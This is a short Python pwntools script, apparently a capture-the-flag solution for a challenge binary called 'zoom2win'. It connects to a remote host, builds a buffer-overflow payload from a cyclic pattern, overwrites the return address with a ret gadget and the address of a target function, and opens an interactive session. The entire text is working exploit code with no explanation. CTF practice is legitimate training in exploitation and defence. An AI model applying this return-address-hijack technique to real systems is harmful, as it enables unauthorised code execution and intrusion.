from pwn import *

# p = process("./zoom2win")
p = remote("143.198.184.186", 5003)

p.recv()
payload = cyclic(500)
payload = payload[:cyclic_find('kaaa')] + p64(0x00000000004011dd) + p64(0x401196)
print(payload)
p.sendline(payload)
p.interactive()
